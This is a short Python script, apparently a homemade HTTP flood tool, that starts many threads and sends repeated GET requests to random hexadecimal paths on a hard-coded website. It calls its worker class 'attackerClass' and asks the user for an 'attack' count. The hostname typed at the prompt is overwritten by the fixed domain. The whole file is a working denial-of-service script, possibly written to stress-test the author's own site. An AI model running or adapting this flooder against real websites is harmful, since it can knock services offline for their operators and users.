#!/usr/bin/python3
# encoding = utf-8

import random
import string
import threading

import requests

url_protocol = "https"
url_hostname = input("Input hostname: ")
url_hostname = "www.aojie654.com"
# print("Hostname: {:}".format(url_hostname))
url_base = "{:}://{:}".format(url_protocol, url_hostname)
letters_tmp = string.hexdigits

threads_limit = int(input("Input threads: "))

attack_limit = int(input("Input acctack limits: "))


class attackerClass(threading.Thread):
    """
    attackerClass(counter_min, counter_max)
    """

    def __init__(self, url_base, limit_max):
        threading.Thread.__init__(self)
        self.url_base = url_base
        self.limit_max = limit_max

    def run(self):
        for counter_tmp in range(1, self.limit_max+1):
            url_uri = "/"
            uri_len_range = round(random.random() * 20)
            for uri_len_counter in range(uri_len_range):
                url_uri = url_uri + random.choice(letters_tmp)
            url_url = "{:}{:}".format(self.url_base, url_uri)

            print_msg = "Time: {:}/{:}, URL: {:}, ".format(counter_tmp, self.limit_max, url_url)
            try:
                response_obj = requests.request(method="GET", url=url_url, timeout=5)
                print_msg = print_msg + "status code: {:}".format(response_obj.status_code)
            except Exception as e:
                print_msg = print_msg + "exception: {:}".format(e)
            else:
                pass

            print(print_msg)


if __name__ == '__main__':
    for counter_tmp in range(1, threads_limit+1):
        thread_tmp = attackerClass(url_base, attack_limit)
        thread_tmp.start()
